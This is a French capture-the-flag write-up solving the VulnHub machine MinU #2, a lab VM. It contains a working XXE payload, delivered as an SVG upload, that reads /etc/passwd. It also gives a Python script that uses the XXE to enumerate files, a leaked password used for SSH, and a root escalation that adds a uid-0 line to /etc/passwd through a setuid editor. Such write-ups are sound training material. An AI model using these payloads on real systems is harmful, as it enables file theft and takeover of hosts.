---
title: "Solution du CTF MinU #2 de VulnHub"
tags: [CTF,VulnHub]
---

[MinU #2](https://vulnhub.com/entry/minu-v2,333/) est un CTF créé par *8BitSec*. Il est assez original comme son prédécesseur.

## Kemal Ouila

On trouve sur le port 3306 non pas un MySQL mais un serveur web avec une signature inhabituelle :

```
Nmap scan report for 192.168.56.216
Host is up (0.00042s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.0 (protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:8.0: 
|       CVE-2020-15778  6.8     https://vulners.com/cve/CVE-2020-15778
|       C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3    6.8     https://vulners.com/githubexploit/C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3  *EXPLOIT*
|       10213DBE-F683-58BB-B6D3-353173626207    6.8     https://vulners.com/githubexploit/10213DBE-F683-58BB-B6D3-353173626207  *EXPLOIT*
|       CVE-2021-41617  4.4     https://vulners.com/cve/CVE-2021-41617
|       CVE-2019-16905  4.4     https://vulners.com/cve/CVE-2019-16905
|       CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145
|       CVE-2016-20012  4.3     https://vulners.com/cve/CVE-2016-20012
|_      CVE-2021-36368  2.6     https://vulners.com/cve/CVE-2021-36368
3306/tcp open  mysql?
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain
|     Transfer-Encoding: chunked
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     X-Powered-By: Kemal
|     Content-Type: text/html
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <style type="text/css">
|     body { text-align:center;font-family:helvetica,arial;font-size:22px;
|     color:#888;margin:20px}
|     max-width: 579px; width: 100%; }
|     {margin:0 auto;width:500px;text-align:left}
|     </style>
|     </head>
|     <body>
|     <h2>Kemal doesn't know this way.</h2>
```

J'ai d'abord cru à l'édition d'un entête dans la configuration Apache, mais en faisant une recherche il s'avère qu'il s'agit d'un vrai framework web : [GitHub - kemalcr/kemal: Fast, Effective, Simple Web Framework](https://github.com/kemalcr/kemal)

Plus étrange encore, il est basé sur un langage qui m'est inconnu, baptisé [Crystal](https://crystal-lang.org/), dont la syntaxe est très proche de Ruby.

Je m'attendais donc plus à trouver un path sans extension du type API pourtant une énumération m'a remonté ce formulaire d'upload :

```
200       28l       65w      908c http://192.168.56.216:3306/upload.html
```

Le formulaire nous demande explicitement une image SVG.

Qui dit SVG dit XML donc dit XXE...

J'ai créé le fichier XML suivant et l'ai uploadé :

```xml
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo[<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
```

J'obtiens alors le contenu de `/etc/passwd` en réponse :

```html

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
postgres:x:70:70::/var/lib/postgresql:/bin/sh
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
chrony:x:100:101:chrony:/var/log/chrony:/sbin/nologin
employee:x:1000:1000:Linux User,,,:/home/employee:/bin/ash
</foo>
Upload OK
```

Je note l'existence du nom d'utilisateur `employee`.

Avec le script suivant je peux énumérer la présence de fichiers et dossiers sur la VM via une wordlist :

```python
import sys
import requests

data = """<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo[<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://{}">]><foo>&xxe;</foo>"""
data = """<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo[<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///home/employee/{}">]><foo>&xxe;</foo>"""
sess = requests.session()

with open(sys.argv[1]) as fd:
    for path in fd:
        path = path.strip()
        response = sess.post(
                "http://192.168.56.216:3306/upload",
                files={"svg": ("image.svg", data.format(path))}
        )
        if "Is a directory" in response.text:
            print("d", path)
        elif "Permission denied" in response.text:
            print("e", path)
        elif "parser error" in response.text:
            continue
        else:
            print("f", path)
```

Ce qu'il fallait faire donc notre cas, c'est accéder au fichier `/home/employee/.ash_history` car on peut lire dans `/etc/passwd` que l'utilisateur utilise le shell `ash`.

On obtenait alors la commande suivante :

```bash
useradd -D bossdonttrackme -p superultrapass3
exit
```

## Si bibi déçu, monnaie rendue

La commande laisse supposer qu'il y a un utilisateur `bossdonttrackme` sur le système, mais ce n'est pas le cas.

On parvient tout de même à se connecter au SSH avec les identifiants `employee` / `superultrapass3`.

Je remarque le code `perl` suivant dans le dossier de l'utilisateur :

```perl
minuv2:~$ cat main.pl 
#!/usr/bin/perl

use 5.010;
use strict;
use warnings;

use XML::LibXML;

my $filename = 'image.svg';
my $dom = XML::LibXML->load_xml(location => $filename);

print $dom
```

Ça explique pourquoi j'ai vu mentionné `perl` lors de l'exfiltration de certains fichiers. Par exemple avec `/proc/self/cmdline` j'obtenais :

```
file:///proc/self/cmdline:1: parser error : Char 0x0 out of allowed range
perl
    ^
image.svg:1: parser error : Failure to process entity xxe
o[<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///proc/self/cmdline">]><foo>&xxe;
                                                                                ^
image.svg:1: parser error : Entity 'xxe' not defined
o[<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///proc/self/cmdline">]><foo>&xxe;
                                                                                ^
Upload OK
```

Donc le serveur récupérait le fichier SVG sous un nom hardcodé et lançait le script perl dessus, ce dernier étant vulnérable à une faille XXE.

Pour l'escalade de privilèges je trouve un binaire nommé `micro` :

```console
minuv2:/$ find / -type f -perm -u+s  2> /dev/null 
/usr/bin/micro
/bin/bbsuid
```

La VM tourne sous _Alpine Linux_ et il s'avère que [Micro](https://micro-editor.github.io/) est un éditeur de texte au look très proche de Emacs.

D'ailleurs en faisant un `Ctrl+O` il me permet de spécifier quel fichier je souhaite éditer.

Comme le binaire est setuid root j'ouvre `/etc/passwd` pour rajouter la ligne suivante :

```
devloop:ueqwOCnSGdsuM:0:0::/root:/bin/sh
```

J'utilise ensuite la touche `Echap` pour sortir et je valide l'écriture. Je peux alors passer root :

```console
minuv2:/$ su devloop
Password: 
minuv2:/# cd /root
minuv2:~# ls
flag.txt
minuv2:~# cat flag.txt
        _                   ____  
  /\/\ (_)_ __  /\ /\__   _|___ \ 
 /    \| | '_ \/ / \ \ \ / / __) |
/ /\/\ \ | | | \ \_/ /\ V / / __/ 
\/    \/_|_| |_|\___/  \_/ |_____|

# You got r00t!

 flag{6d696e75326973617765736f6d65}

# I hope you had fun hacking this box, I tried to design this VM to be (a bit) different
# by having newer or not-so-common technologies and a minumal linux install.
#
# Please don't post the content below on Social Networks to let others do the challenge.
#
# As you know by now, the entry point is an XXE vulnerability that can be exploited by
# modifying an image. After that you can enumerate a user and the linux version to know
# that it uses a different file in its home dir.
# To read this you used a suspicious file permission on certain text editor.
# At least that's how it was planned ;)
# Let me know if you got here using another method!
#
# contact@8bitsec.io
# @_8bitsec
```
